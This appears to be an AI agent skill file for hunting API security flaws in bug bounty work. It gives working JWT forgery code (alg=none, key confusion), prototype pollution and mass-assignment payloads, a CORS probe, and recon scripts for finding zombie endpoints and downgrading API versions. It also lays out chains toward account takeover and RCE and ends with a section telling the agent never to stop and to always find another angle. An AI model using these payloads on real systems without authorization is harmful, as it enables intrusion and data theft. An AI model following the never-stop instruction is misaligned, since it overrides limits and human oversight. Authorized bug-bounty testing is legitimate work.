---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, CORS, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). CORS: wildcard with credentials, null origin, regex with subdomain takeover, postMessage origin checks. HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io), CORS preflight responses. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution, CORS bypasses. Only invoke this skill if there is real impact potential. Skip theoretical findings."
---

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## 13. Zombie Endpoints (Deprecated-but-Live APIs)

Old API endpoints removed from documentation, SDKs, and UI — but still routing on the server. Defenders forget they exist; security testing doesn't cover them; auth/rate-limit/CSRF protections often missed in the rebuild.

### Where to find zombies
```bash
# 1. Wayback Machine — every endpoint the target's site ever called
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=original&collapse=urlkey" \
  | jq -r '.[1:][] | .[0]' | sort -u > recon/wayback-urls.txt
grep -E '/api/|/v[0-9]+/|/rest/|/graphql' recon/wayback-urls.txt | sort -u > recon/wayback-api.txt

# 2. gau / waybackurls — aggregated archive URL sources
gau target.com | grep -E '/api/|/v[0-9]+/' | sort -u > recon/gau-api.txt
waybackurls target.com | grep -E '/api/' | sort -u > recon/wb-api.txt

# 3. JS bundle diff — old endpoints in archived JS no longer in live bundle
# Get historical JS bundles from Wayback, then diff against live
for snapshot_url in $(curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/static/js/*&output=json&collapse=digest" | jq -r '.[1:][] | "https://web.archive.org/web/\(.[1])if_/\(.[0])"'); do
  curl -s "$snapshot_url" >> /tmp/historic-js.txt
done
grep -oE '"/api/[a-zA-Z0-9./_-]+"' /tmp/historic-js.txt | sort -u > recon/historic-endpoints.txt
grep -oE '"/api/[a-zA-Z0-9./_-]+"' live-bundle.js | sort -u > recon/live-endpoints.txt
diff recon/historic-endpoints.txt recon/live-endpoints.txt | grep '^<' > recon/zombie-candidates.txt

# 4. Sitemap / robots.txt history
curl -s "https://web.archive.org/web/*/target.com/robots.txt" | grep -i "disallow" | sort -u
```

### Validate each candidate
```bash
# For each zombie endpoint, probe and check response
for url in $(cat recon/zombie-candidates.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$url")
  # 200 = live (definitely worth testing)
  # 401/403 = live, auth required (still worth testing — may have weaker checks)
  # 404 = removed
  # 500 = code path exists but errored — investigate
  echo "$code $url"
done | sort
```

### Why zombies are gold
- **Old auth model** — pre-OAuth2 / pre-MFA / pre-RBAC era. May accept legacy session cookie, basic auth, or unauth.
- **No rate-limiting** — added later only on documented endpoints.
- **No CSRF token** — pre-cookie-csrf-double-submit era.
- **Verbose errors** — old code without modern error sanitization.
- **Trust assumptions** — designed for "internal callers" originally.
- **Mass assignment** — old endpoints often accept the full DB row.

---

## 14. API Version Downgrade

Multiple versions live on the same server. Newer version has hardened auth/encoding; older version is left running for backwards compatibility.

### Endpoints to spray
```
/api/v1/users/me, /api/v2/users/me, /api/v3/users/me
/api/v0/...    (sometimes "internal" first version)
/api/legacy/...
/api/old/...
/api/alpha/..., /api/beta/...
/api/external/v1/..., /api/external/v2/...
```

### What changes between versions (each = a downgrade opportunity)
- v1: cookie auth; v2: bearer JWT. → Cookie-auth endpoint accepts CSRF; force users to send via XHR.
- v1: returns `password_hash`; v2: removed. → Old endpoint still leaks.
- v1: accepts `is_admin` in body; v2: ignores. → Mass-assignment lives in v1.
- v1: no rate limit; v2: rate limited. → Brute force only on v1.
- v1: returns `email`; v2: redacts to `e*@target.com`. → Enumeration via v1.

### Probe pattern
```bash
# Find the deprecated-but-live endpoint
for v in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v0 alpha beta legacy old internal external; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/$v/users/me" -H "$AUTH")
  echo "$code /api/$v/users/me"
done

# For each live version, diff responses
for v in v1 v2 v3; do
  curl -s "https://target.com/api/$v/users/me" -H "$AUTH" > /tmp/resp-$v.json
done
diff /tmp/resp-v1.json /tmp/resp-v2.json
# Extra fields in v1 = leaked PII candidates
```

### Verb / header downgrade variants
```
X-API-Version: 1.0   (header instead of path — older versions often accept)
Accept: application/vnd.target.v1+json
X-Forwarded-Version: 1
X-Original-Method: GET    (old verb tunneling)
```

---

## 15. JS Bundle Diff Analysis

Live JS bundles change weekly; bug-fix and security-patch commits often only change client-side. Diffing bundles reveals *what changed* and what new endpoints exist.

### Snapshot workflow
```bash
# Take a snapshot
TARGET_BUNDLE="https://target.com/static/js/main.abc123.js"
curl -s "$TARGET_BUNDLE" | js-beautify > /tmp/bundle-$(date +%s).js

# Compare against last snapshot
diff /tmp/bundle-1700000000.js /tmp/bundle-1700604800.js > /tmp/bundle-diff.txt

# Look for new endpoints, new headers, new feature flags
grep -E '"/(api|admin|internal)/' /tmp/bundle-diff.txt | grep '^>'

# Look for removed endpoints — these may still work on server (zombie)
grep -E '"/(api|admin|internal)/' /tmp/bundle-diff.txt | grep '^<'
```

### What to grep in any bundle (current or historical)
```bash
# All endpoints
grep -oE '"/[a-zA-Z0-9/_-]+\?[a-zA-Z]+=' bundle.js | sort -u
grep -oE 'fetch\(["`]([^"`]+)' bundle.js | sort -u
grep -oE 'axios\.\w+\(["`]([^"`]+)' bundle.js | sort -u

# Feature flags / experimental routes (early access to unreleased features)
grep -oE '"(feature_|flag_|experiment_)[a-zA-Z_]+"' bundle.js | sort -u
grep -iE 'enable.*(beta|experimental|admin|internal|dev)' bundle.js

# Hardcoded backend hosts
grep -oE '"https?://[a-zA-Z0-9./_-]+"' bundle.js | grep -vE '(google|gstatic|youtube|googleapis|jsdelivr|unpkg|sentry|datadog|hotjar)' | sort -u

# Hardcoded keys (sometimes the bundle leaks)
grep -oE '"(api_key|publishable|client_id|public_token)"[^,]+' bundle.js | sort -u
```

### Sourcemap recovery (massive amplifier)
If `bundle.js` references a sourcemap (look for `//# sourceMappingURL=`), use `shuji` to reconstruct full original source:
```bash
shuji main.abc123.js.map -o ./reconstructed/
# Now you have all original .tsx files including comments — often contains TODOs and notes about insecure flows
```

---

## 16. Wayback Machine API Comparison (Historic vs Live)

A target's API behavior changes over time. Wayback Machine has snapshots of API responses (when the response was static or cached). Comparing old vs new reveals what was removed:

```bash
# Find historical responses
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/api/v1/users/&output=json&matchType=prefix" \
  | jq -r '.[1:][] | "\(.[1]) \(.[0])"' | head -20

# Fetch a historical response
curl -s "https://web.archive.org/web/2022if_/https://target.com/api/v1/users/me"
# Compare to live
curl -s "https://target.com/api/v1/users/me"
# Fields removed from live response may still be retrievable via the v1/zombie endpoint
```

### Information-leak detection
The wayback diff often reveals:
- Old responses contained `internal_user_id`, `created_by_admin_id`, `last_modified_internal_note`
- Newer responses redact these — but the *endpoint that emits* them may still leak via header / `?fields=*` / GraphQL fragment

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.


## Fallback Chain
1. Try the techniques in this skill first
2. If they fail or don't apply, use your own creativity
3. Never stop because a technique didn't work
4. Always find another angle

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **Exposed Kubernetes API → RCE/Exposed Creds** | Snapchat | $25,000 | H1 #455645 |
| JumpCloud API Key leaked via Open GitHub repo | Starbucks | $0 | H1 #716292 |
| Flickr Account Takeover using AWS Cognito API | Flickr | $0 | H1 #1342088 |
| API access to Phabricator via leaked cert in git repo | Uber | $39,999 | H1 #591813 |
| DoS to WP-JSON API by cache poisoning CORS allow origin | Automattic | $0 | H1 #591302 |
| Blind SSRF to internal services in matrix preview_link API | Reddit | $6,000 | H1 #1960765 |
| Blind SQLi → RCE from unauth test API | Starbucks | $0 | H1 #592400 |
| Google API key leaked to public | FetLife | $0 | H1 #1065041 |
| GitHub Apps user-to-server tokens full access to Project V2 | GitHub | $0 | H1 #1711938 |
| IDOR API endpoint leaking sensitive user info | Razer | $375 | H1 #723118 |
| Unauthorized Access to TikTok Private Videos via API | TikTok | $0 | H1 #2868084 |
| DOS via Mutation Aliasing in GraphQL Account Recovery | HackerOne | $12,500 | H1 #3287208 |
| Undocumented `fileCopy` GraphQL API | Shopify | $2,000 | H1 #981472 |
| Public + secret API key leaked in JS source | Stripo | $0 | H1 #983331 |
| Banned user still has API access via API key | HackerOne | $0 | H1 #1577940 |
| Disclose any user's private email through API | HackerOne | $0 | H1 #196655 |
| Yet Another OTP code Leaked in API Response | MTN Group | $0 | H1 #2635315 |
| **Apache Flink RCE via GET jar/plan API Endpoint** | Aiven Ltd | $6,000 | H1 #1418891 |
| Client secret/server tokens returned by internal API | Uber | $0 | H1 #419655 |
| Full access to InDrive jira panel via exposed API token | inDrive | $1,500 | H1 #1785145 |

**PROVEN patterns** (3+ reports): admin/internal API endpoint exposed unauthenticated (Snapchat k8s, Starbucks test API, Apache Flink), API keys leaked in JS/git (FetLife, Stripo, Uber, Starbucks), undocumented endpoints discoverable via swagger/introspection, OTP/secret leaked in API response body, IDOR on REST/GraphQL APIs against object IDs.

## High-Value Chains (from Reports)

1. **Unauthenticated admin API → full cluster RCE**
   - Snapchat (H1 #455645, $25k) — exposed Kubernetes API unauth → deployed pod → RCE → cluster secrets dump.
2. **Leaked API token in git/JS → API access → mass data extraction**
   - Uber Phabricator (H1 #591813, $40k), inDrive Jira (#1785145, $1.5k) — recon found token → authenticated API access to internal systems.
3. **Undocumented endpoint via swagger/introspection → unauthorized action**
   - Shopify fileCopy GraphQL (H1 #981472, $2k) — discovered via introspection, no auth check on mutation.
4. **Mutation aliasing on rate-limited API → MFA brute force / abuse**
   - HackerOne (H1 #3287208, $12.5k) — GraphQL aliasing defeated per-mutation throttling.
5. **API key with broader-than-expected scope → privilege escalation**
   - GitHub Apps Project V2 (H1 #1711938) — scoped user-to-server token granted unintended write on Project V2 GraphQL surface.
